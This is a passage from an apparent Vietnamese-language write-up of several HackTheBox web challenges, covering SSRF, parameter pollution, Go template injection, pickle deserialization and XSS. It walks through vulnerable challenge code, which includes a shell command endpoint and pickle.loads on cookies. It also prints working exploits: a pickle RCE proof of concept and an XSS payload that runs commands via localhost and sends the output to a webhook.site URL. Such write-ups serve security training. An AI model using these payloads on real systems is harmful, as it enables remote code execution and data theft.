    if request.remote_addr == '127.0.0.1':
        flag = ""
        with open('./flag.txt') as f:
            flag = f.readline()
        return render_template('secret.html', SECRET=flag)
    else:
        return render_template('forbidden.html'), 403
```

- Chỉ chấp nhận localhost và trả ra flag cho mình -> bài này đơn giản là SSRF để lấy flag qua localhost.
- Vấn đề ở đây là bypass được `safeurl` để gửi đến localhost.

![image](https://hackmd.io/_uploads/HJw-7NgLA.png)



- TOC/TOU: https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use


## HTBank

- Một chall được viết bằng flask_frontend + php_backend + Mysql


### php_backend

```
<?php spl_autoload_register(function ($name) {
    if (preg_match('/Controller$/', $name)) {
        $name = "controllers/${name}";
    } elseif (preg_match('/Model$/', $name)) {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$database = new Database('localhost', 'xclow3n', 'xCl0w3n1337!!', 'web_htbank');
$database->connect();

$router = new Router();
$router->new('POST', '/api/withdraw', 'WithdrawController@index');

die($router->match());

```

- ở đây có một api duy nhất đó là `/api/withdraw` và logic của nó hoạt động như sau:

```
<?php

class WithdrawController extends Controller
{
    public function __construct()
    {
        parent::__construct();
    }

    public function index($router)
    {
        $amount = $_POST['amount'];
        $account = $_POST['account'];

        if ($amount == 1337) {
            $this->database->query('UPDATE flag set show_flag=1');

            return $router->jsonify([
                'message' => 'OK'
            ]);
        }

        return $router->jsonify([
            'message' => 'We don\'t accept that amount'
        ]);
    }

}
```

- ở đây sẽ nhận 2 tham số POST đó là amount và account -> nếu amount == 1337 thì update bảng flag set show_flag=1 -> trả ra ok nếu thành công.


### flask_frontend

- ở đây ta có thể thấy có 2 route chính :


```

from flask import Flask
from application.blueprints.routes import web, api
from application.database import mysql
from application.util import response

app = Flask(__name__)
app.config.from_object('application.config.Config')

mysql.init_app(app)

app.register_blueprint(web, url_prefix='/')
app.register_blueprint(api, url_prefix='/api')

@app.errorhandler(404)
def not_found(error):
    return response('404 Not Found'), 404

@app.errorhandler(403)
def forbidden(error):
    return response('403 Forbidden'), 403

@app.errorhandler(400)
def bad_request(error):
    return response('400 Bad Request'), 400

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, 'description') else [str(x) for x in error.args]
    response = {
        'error': {
            'type': error.__class__.__name__,
            'message': message
        }
    }

    return response, error.code if hasattr(error, 'code') else 500
```

- Nó được import từ :


```

from application.database import *
from flask import Blueprint, session, jsonify, redirect, render_template, request, make_response, current_app
from application.util import response, isAuthenticated
import datetime, sys, requests

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def login():
    return render_template('login.html')

@web.route('/home')
@isAuthenticated
def home(decoded_token):
    user = getUser(decoded_token.get('username'))
    flag = getFlag()
    
    if(flag[0].get('show_flag') == 1):
        return render_template('home.html', user=user[0], flag=flag[0].get('flag'))


    return render_template('home.html', user=user[0])

@web.route('/logout')
def logout():
    res = make_response(redirect('/'))
    res.set_cookie('session', '', expires=0)
    return res

@api.route('/login', methods=['POST'])
def api_login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
        
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login_user_db(username, password)
    
    if user:
        res = response('Logged in successfully!')
        res.status_code = 200
        res.set_cookie('session', user, expires=datetime.datetime.utcnow() + datetime.timedelta(minutes=360), httponly=False)
        return res

    return response('Invalid credentials!'), 403

@api.route('/register', methods=['POST'])
def api_register():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = register_user_db(username, password)
    
    if user:
        return response('User registered! Please login'), 200
        
    return response('User already exists!'), 403

@api.route('/withdraw', methods=['POST'])
@isAuthenticated
def withdraw(decoded_token):
    body = request.get_data()
    amount = request.form.get('amount', '')
    account = request.form.get('account', '')
    
    if not amount or not account:
        return response('All fields are required!'), 401
    
    user = getUser(decoded_token.get('username'))

    try:
        if (int(user[0].get('balance')) < int(amount) or int(amount) < 0 ):
            return response('Not enough credits!'), 400

        res = requests.post(f"http://{current_app.config.get('PHP_HOST')}/api/withdraw", 
            headers={"content-type": request.headers.get("content-type")}, data=body)
        
        jsonRes = res.json()

        return response(jsonRes['message'])
    except:
        return response('Only accept number!'), 500
```

- Có thể thấy ở đây có các route /home sẽ nhận được flag khi show_flag=1 tức ra ta phải gọi đến api/withdraw kia của backend_php.
- Route /withdraw với method post nhận account và amount từ client -> :: 
```
if (int(user[0].get('balance')) < int(amount) or int(amount) < 0 ):
            return response('Not enough credits!'), 400
```

- Lưu ý là khi gửi data đến be nó lại dùng `  body = request.get_data()` nên ta có thể lợi dụng để truyền 2 lần amount == 1337 và nhận flag:

![image](https://hackmd.io/_uploads/rJAFmb_80.png)

![image](https://hackmd.io/_uploads/rJjnQb_8R.png)


![image](https://hackmd.io/_uploads/Byh4EZO8C.png)


![image](https://hackmd.io/_uploads/B13I4Z_U0.png)

Flag: ``HTB{p4r4m3t3r_p0llut10n_4r3_1mp0rt4nt_p4tch_1t_B0NK!}``


## GhostlyTemplates

- một chall với golang + template -> với tên chall thì ta có thể nghĩ đến nó là một vul với template mà chỉ có ssti được thôi -> cùng vào phân tích source code:

```

package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const WEB_PORT = "1337"
const TEMPLATE_DIR = "./templates"

type LocationInfo struct {
	Status      string  `json:"status"`
	Country     string  `json:"country"`
	CountryCode string  `json:"countryCode"`
	Region      string  `json:"region"`
	RegionName  string  `json:"regionName"`
	City        string  `json:"city"`
	Zip         string  `json:"zip"`
	Lat         float64 `json:"lat"`
	Lon         float64 `json:"lon"`
	Timezone    string  `json:"timezone"`
	ISP         string  `json:"isp"`
	Org         string  `json:"org"`
	AS          string  `json:"as"`
	Query       string  `json:"query"`
}

type MachineInfo struct {
	Hostname      string
	OS            string
	KernelVersion string
	Memory        string
}

type RequestData struct {
	ClientIP     string
	ClientUA     string
	ServerInfo   MachineInfo
	ClientIpInfo LocationInfo `json:"location"`
}

func GetServerInfo(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return ""
	}
	return string(out)
}

func (p RequestData) GetLocationInfo(endpointURL string) (*LocationInfo, error) {
	resp, err := http.Get(endpointURL)
	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP request failed with status code: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var locationInfo LocationInfo
	if err := json.Unmarshal(body, &locationInfo); err != nil {
		return nil, err
	}

	return &locationInfo, nil
}

func (p RequestData) IsSubdirectory(basePath, path string) bool {
	rel, err := filepath.Rel(basePath, path)
	if err != nil {
		return false
	}
	return !strings.HasPrefix(rel, ".."+string(filepath.Separator))
}

func (p RequestData) OutFileContents(filePath string) string {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err.Error()
	}
	return string(data)
}

func readRemoteFile(url string) (string, error) {
	response, err := http.Get(url)
	if err != nil {
		return "", err
	}

	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("HTTP request failed with status code: %d", response.StatusCode)
	}

	content, err := io.ReadAll(response.Body)
	if err != nil {
		return "", err
	}

	return string(content), nil
}

func getIndex(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "/view?page=index.tpl", http.StatusMovedPermanently)
}

func getTpl(w http.ResponseWriter, r *http.Request) {
	var page string = r.URL.Query().Get("page")
	var remote string = r.URL.Query().Get("remote")

	if page == "" {
		http.Error(w, "Missing required parameters", http.StatusBadRequest)
		return
	}

	reqData := &RequestData{}

	userIPCookie, err := r.Cookie("user_ip")
	clientIP := ""

	if err == nil {
		clientIP = userIPCookie.Value
	} else {
		clientIP = strings.Split(r.RemoteAddr, ":")[0]
	}

	userAgent := r.Header.Get("User-Agent")

	locationInfo, err := reqData.GetLocationInfo("https://freeipapi.com/api/json/" + clientIP)

	if err != nil {
		http.Error(w, "Could not fetch IP location info", http.StatusInternalServerError)
		return
	}

	reqData.ClientIP = clientIP
	reqData.ClientUA = userAgent
	reqData.ClientIpInfo = *locationInfo
	reqData.ServerInfo.Hostname = GetServerInfo("hostname")
	reqData.ServerInfo.OS = GetServerInfo("cat /etc/os-release | grep PRETTY_NAME | cut -d '\"' -f 2")
	reqData.ServerInfo.KernelVersion = GetServerInfo("uname -r")
	reqData.ServerInfo.Memory = GetServerInfo("free -h | awk '/^Mem/{print $2}'")

	var tmplFile string

	if remote == "true" {
		tmplFile, err = readRemoteFile(page)

		if err != nil {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
	} else {
		if !reqData.IsSubdirectory("./", TEMPLATE_DIR+"/"+page) {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		tmplFile = reqData.OutFileContents(TEMPLATE_DIR + "/" + page)
	}

	tmpl, err := template.New("page").Parse(tmplFile)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	err = tmpl.Execute(w, reqData)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
}

func main() {
	mux := http.NewServeMux()

	mux.HandleFunc("/", getIndex)
	mux.HandleFunc("/view", getTpl)
	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	fmt.Println("Server started at port " + WEB_PORT)
	http.ListenAndServe(":"+WEB_PORT, mux)
}

```

- Có 2 route chính:

```
mux.HandleFunc("/", getIndex)
mux.HandleFunc("/view", getTpl)
```

- / chỉ đơn giản là trả ra `page=index.tpl`
- /view route:

```

func getTpl(w http.ResponseWriter, r *http.Request) {
	var page string = r.URL.Query().Get("page")
	var remote string = r.URL.Query().Get("remote")

	if page == "" {
		http.Error(w, "Missing required parameters", http.StatusBadRequest)
		return
	}

	reqData := &RequestData{}

	userIPCookie, err := r.Cookie("user_ip")
	clientIP := ""

	if err == nil {
		clientIP = userIPCookie.Value
	} else {
		clientIP = strings.Split(r.RemoteAddr, ":")[0]
	}

	userAgent := r.Header.Get("User-Agent")

	locationInfo, err := reqData.GetLocationInfo("https://freeipapi.com/api/json/" + clientIP)

	if err != nil {
		http.Error(w, "Could not fetch IP location info", http.StatusInternalServerError)
		return
	}

	reqData.ClientIP = clientIP
	reqData.ClientUA = userAgent
	reqData.ClientIpInfo = *locationInfo
	reqData.ServerInfo.Hostname = GetServerInfo("hostname")
	reqData.ServerInfo.OS = GetServerInfo("cat /etc/os-release | grep PRETTY_NAME | cut -d '\"' -f 2")
	reqData.ServerInfo.KernelVersion = GetServerInfo("uname -r")
	reqData.ServerInfo.Memory = GetServerInfo("free -h | awk '/^Mem/{print $2}'")

	var tmplFile string

	if remote == "true" {
		tmplFile, err = readRemoteFile(page)

		if err != nil {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
	} else {
		if !reqData.IsSubdirectory("./", TEMPLATE_DIR+"/"+page) {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		tmplFile = reqData.OutFileContents(TEMPLATE_DIR + "/" + page)
	}

	tmpl, err := template.New("page").Parse(tmplFile)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	err = tmpl.Execute(w, reqData)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
}
```


- Nhận 2 parameter đó là page và remote -> lấy cả `user_ip` từ cookie ủa người dùng -> nhận `userAgent` -> kiểm tra ip location nếu không có trả ra  error -> khai báo biến `tmplFile` ->  remote == "true" -> gọi `tmplFile, err = readRemoteFile(page)`:


```
func readRemoteFile(url string) (string, error) {
	response, err := http.Get(url)
	if err != nil {
		return "", err
	}

	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("HTTP request failed with status code: %d", response.StatusCode)
	}

	content, err := io.ReadAll(response.Body)
	if err != nil {
		return "", err
	}

	return string(content), nil
}
```

- Hàm này sẽ trả ra một string nhận về sau khi get đến url.
- Quay trở lại với luồng chính của chương trình -> `tmpl, err := template.New("page").Parse(tmplFile)` -> thực hiện render `err = tmpl.Execute(w, reqData)`.

- Nguyển nhân dẫn đến lỗ hổng : https://www.onsecurity.io/blog/go-ssti-method-research/


### Exploit

![image](https://hackmd.io/_uploads/SkMQT-_80.png)


![image](https://hackmd.io/_uploads/ryDyTbdUC.png)


![image](https://hackmd.io/_uploads/SJpgaZdIA.png)

![image](https://hackmd.io/_uploads/rJEHTWdLC.png)


flag: ``HTB{t3mpl14t35_c4us3_p41n_4nd_f1l35_1nclud3s!}``



## Spellbound Servants

- Tương tự như các chall python trước thì chall này cũng có 2 route chính:

```
from flask import Flask
from application.blueprints.routes import web, api
from application.database import mysql
from application.util import response

app = Flask(__name__)
app.config.from_object('application.config.Config')

mysql.init_app(app)

app.register_blueprint(web, url_prefix='/')
app.register_blueprint(api, url_prefix='/api')

@app.errorhandler(404)
def not_found(error):
    return response('404 Not Found'), 404

@app.errorhandler(403)
def forbidden(error):
    return response('403 Forbidden'), 403

@app.errorhandler(400)
def bad_request(error):
    return response('400 Bad Request'), 400

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, 'description') else [str(x) for x in error.args]
    response = {
        'error': {
            'type': error.__class__.__name__,
            'message': message
        }
    }

    return response, error.code if hasattr(error, 'code') else 500
```

- Đó là / và /api -> cùng quan sát logic code ->

```
from application.database import *
from flask import Blueprint, redirect, render_template, request, make_response
from application.util import response, isAuthenticated

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/', methods=['GET', 'POST'])
def loginView():
    return render_template('login.html')

@web.route('/register', methods=['GET', 'POST'])
def registerView():
    return render_template('register.html')

@web.route('/home', methods=['GET', 'POST'])
@isAuthenticated
def homeView(user):
    return render_template('index.html', user=user)

@api.route('/login', methods=['POST'])
def api_login():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login_user_db(username, password)
    
    if user:
        res = make_response(response('Logged In sucessfully'))
        res.set_cookie('auth', user)
        return res
        
    return response('Invalid credentials!'), 403

@api.route('/register', methods=['POST'])
def api_register():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = register_user_db(username, password)
    
    if user:
        return response('User registered! Please login'), 200
        
    return response('User already exists!'), 403

```

- Có thể thấy chương trình có các chức năng đó là reg,login, /, /home:

- Sau khi tiến hành đăng kí với username và password -> tiến hành lưu user vào trong db:

```
def register_user_db(username, password):
    check_user = query('SELECT username FROM users WHERE username = %s', (username,), one=True)

    if not check_user:
        query('INSERT INTO users(username, password) VALUES(%s, %s)', (username, password,))
        mysql.connection.commit()
        
        return True
    
    return False
```

- Tiếp theo login -> server cũng nhận username và password từ người dùng -> 

```
def login_user_db(username, password):
    user = query('SELECT username FROM users WHERE username = %s AND password = %s', (username, password,), one=True)
    
    if user:
        pickled_data = base64.b64encode(pickle.dumps(user))
        return pickled_data.decode("ascii") 
    else:
        return False
```
- Tìm các bản ghi của username với username và password sau đó gọi `base64.b64encode(pickle.dumps` và trả ra `pickled_data.decode("ascii")` 
- Thì có vẻ vul ở đây như ta đã biết thì pickle mà ta control được thì có thể dẫn đến RCE ở python.
- Nếu đăng nhập thành công lưu vào cookie với `auth`

- Đó chưa phải là chỗ gây ra lỗ hổng vul nằm ở middleware để check authentication cho người dùng.


```

def isAuthenticated(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        token = request.cookies.get('auth', False)

        if not token:
            return abort(401, 'Unauthorised access detected!')
        
        try:
            user = pickle.loads(base64.urlsafe_b64decode(token))
            kwargs['user'] = user
            return f(*args, **kwargs)
        except:
            return abort(401, 'Unauthorised access detected!')

    return decorator
```

- như ta thấy thì server nhận `auth` từ cookie sau đó gọi `pickle.loads(base64.urlsafe_b64decode(token))` và gắn giá trị cho các session của user.

- Vậy thì vul ở đây

### Flow

- Register -> login -> quan sát quá trình hoạt động nếu bạn là beginer.
- Nếu hiểu rõ rồi thì chỉ cần gen payload rce -> base64-en -> gắn vào cookie auth -> /home và nhận flag.

- Xem vị trí của flag nằm ở /flag.txt

```
FROM python:3.11-alpine

# Install packages
RUN apk update \
    && apk add --no-cache --update mariadb mariadb-dev mariadb-client supervisor gcc musl-dev mariadb-connector-c-dev

# Upgrade pip
RUN python -m pip install --upgrade pip

# Copy flag
COPY flag.txt /flag.txt

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .

# Install dependencies
RUN pip install --no-cache-dir -r requirements.txt

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# create database and start supervisord
COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```


### Exploit

- vul pickle serial to RCE


![image](https://hackmd.io/_uploads/ByJEotqIA.png)

poc: 

```
import pickle, base64

class test:
    def __reduce__(self):
        p="open('/flag.txt').read()"
        return (eval,(p,))

rs={'username':test()}

print(base64.b64encode(pickle.dumps(rs)).decode('utf8'))

```

flag: `HTB{sp3l1_0f_the_p1ckl3!}`


## PumpkinSpice

- Một chall với source code python_flask:


```

import string, time, subprocess
from flask import Flask, request, render_template, abort
from threading import Thread

app = Flask(__name__)

addresses = []

def start_bot():
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait

    host, port = "localhost", 1337
    HOST = f"http://{host}:{port}"

    options = Options()

    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--hide-scrollbars")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--mute-audio")
    options.add_argument("--no-first-run")
    options.add_argument("--dns-prefetch-disable")
    options.add_argument("--safebrowsing-disable-auto-update")
    options.add_argument("--media-cache-size=1")
    options.add_argument("--disk-cache-size=1")
    options.add_argument("--user-agent=HTB/1.0")

    service = Service(executable_path="/usr/bin/chromedriver")
    browser = webdriver.Chrome(service=service, options=options)

    browser.get(f"{HOST}/addresses")
    time.sleep(5)
    browser.quit()


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")


@app.route("/addresses", methods=["GET"])
def all_addresses():
    remote_address = request.remote_addr
    if remote_address != "127.0.0.1" and remote_address != "::1":
        return render_template("index.html", message="Only localhost allowed")

    return render_template("addresses.html", addresses=addresses)


@app.route("/add/address", methods=["POST"])
def add_address():
    address = request.form.get("address")
    
    if not address:
        return render_template("index.html", message="No address provided")

    addresses.append(address)
    Thread(target=start_bot,).start()
    return render_template("index.html", message="Address registered")


@app.route("/api/stats", methods=["GET"])
def stats():
    remote_address = request.remote_addr
    if remote_address != "127.0.0.1" and remote_address != "::1":
        return render_template("index.html", message="Only localhost allowed")

    command = request.args.get("command")
    if not command:
        return render_template("index.html", message="No command provided")

    results = subprocess.check_output(command, shell=True, universal_newlines=True)
    return results


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)

```

- Đầu tiên chúng ta sẽ quan sát vị trí của flag nằm ở `/flag.txt`:


```
FROM python:3.11-alpine

# Setup usr
RUN adduser -D -u 1000 -g 1000 -s /bin/sh www

# Install dependencies
RUN apk add --update --no-cache gcc g++ make openssl-dev

# Install packages
RUN apk add --update --no-cache supervisor chromium chromium-chromedriver

# Copy flag
COPY flag.txt /flag.txt

# Upgrade pip
RUN python -m pip install --upgrade pip

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .

# Install dependencies
RUN pip install -r requirements.txt

# Copy configs
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Copy entrypoint
COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

- Từ vị trí của nó ta có thể thấy là vấn đề ở đây là RCE để nhận được flag nằm ở root -> bắt đầu đi tìm hook tại app.py.

- Ta có thể thấy ngay ở đây là api `/api/stats`:


```
@app.route("/api/stats", methods=["GET"])
def stats():
    remote_address = request.remote_addr
    if remote_address != "127.0.0.1" and remote_address != "::1":
        return render_template("index.html", message="Only localhost allowed")

    command = request.args.get("command")
    if not command:
        return render_template("index.html", message="No command provided")

    results = subprocess.check_output(command, shell=True, universal_newlines=True)
    return results
```

- ở đây sẽ có một `subprocess` được gọi để chạy command được truyền vào với method GET.
- Quan sát nhanh thì yêu cầu localhost và nhận param command -> chạy command này và trả ra kết quả -> vấn đề là bypass được localhost.
- Cùng để ý server có một mảng `addresses = []` để lưu trữ lại các địa chỉ và hiển thị ra template `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="lean">
	<title>🎃 Pumpkin Spice 🎃</title>
</head>
<body>
    <h1>System stats:</h1>
    <p id="stats"></p>
    <h1>Addresses:</h1>
    {% for address in addresses %}
        <p>{{ address|safe }}</p>
    {% endfor %}
    <script src="/static/js/script.js"></script>
</body>
</html>


- Mình có 2 ý tưởng ở đây đó là SSTI hoặc XSS nhưng hãy để ý đến logic code bình thường của nó ở đây.

- Ta thấy đây là nơi khả nghi mà ta có thể truy cập mà không cần localhost:


```

@app.route("/add/address", methods=["POST"])
def add_address():
    address = request.form.get("address")
    
    if not address:
        return render_template("index.html", message="No address provided")

    addresses.append(address)
    Thread(target=start_bot,).start()
    return render_template("index.html", message="Address registered")
```
- method POST nhận address sau đó push address vào trong mảng ở trên -> tạo một thread và start với hàm start bot
- Cùng quan sát hàm start_bot():


```
def start_bot():
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait

    host, port = "localhost", 1337
    HOST = f"http://{host}:{port}"

    options = Options()

    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--hide-scrollbars")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--mute-audio")
    options.add_argument("--no-first-run")
    options.add_argument("--dns-prefetch-disable")
    options.add_argument("--safebrowsing-disable-auto-update")
    options.add_argument("--media-cache-size=1")
    options.add_argument("--disk-cache-size=1")
    options.add_argument("--user-agent=HTB/1.0")

    service = Service(executable_path="/usr/bin/chromedriver")
    browser = webdriver.Chrome(service=service, options=options)

    browser.get(f"{HOST}/addresses")
    time.sleep(5)
    browser.quit()
```

- Sử dụng `selenium` truy cập vào `browser.get(f"{HOST}/addresses")` bằng việc mở chrome.
- Đây là api /addresses:

```
@app.route("/addresses", methods=["GET"])
def all_addresses():
    remote_address = request.remote_addr
    if remote_address != "127.0.0.1" and remote_address != "::1":
        return render_template("index.html", message="Only localhost allowed")

    return render_template("addresses.html", addresses=addresses)
```

- Check localhost và đương nhiên là qua -> render teamplate `addresses.html` với mảng `return render_template("addresses.html", addresses=addresses)
`
### Flow

- Hướng sẽ là xss để get đến `/api/stats` sau đó chạy command `cat /flag.txt` sau đó trả ra kết quả ở bên ngoài.


### Exploit


POC:

```
fetch('http://localhost:1337/api/stats?command=ls+/')
  .then((response) => response.text())
  .then((data) => {
    // Convert the data to base64
    const base64Data = btoa(data);

    // Send the base64-encoded data to your server using a POST request
    fetch('https://webhook.site/14c97bf2-8cd5-4527-8f54-856f5729b95c', {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain', // Set the appropriate content type for base64 data
      },
      body: base64Data, // Send the base64-encoded data as the request body
    })
    .then((response) => {
      if (response.ok) {
        console.log('Response data sent to your server successfully.');
      } else {
        console.error('Failed to send data to your server. Status:', response.status);
      }
    })
    .catch((error) => {
      console.error('Error:', error);
    });
  })
  .catch((error) => {
    console.error('Error fetching data from localhost:', error);
  });

```


![image](https://hackmd.io/_uploads/BJ8tSq5IA.png)
![image](https://hackmd.io/_uploads/rJ32rc5IR.png)

![image](https://hackmd.io/_uploads/H16Trqq8C.png)


- Flag nằm ở `/flage7c47cd9fa.txt`

![image](https://hackmd.io/_uploads/BkxGU9cIC.png)

flag : `HTB{th3_m1s5i0n_f0r_4_fre3_tr34t}`
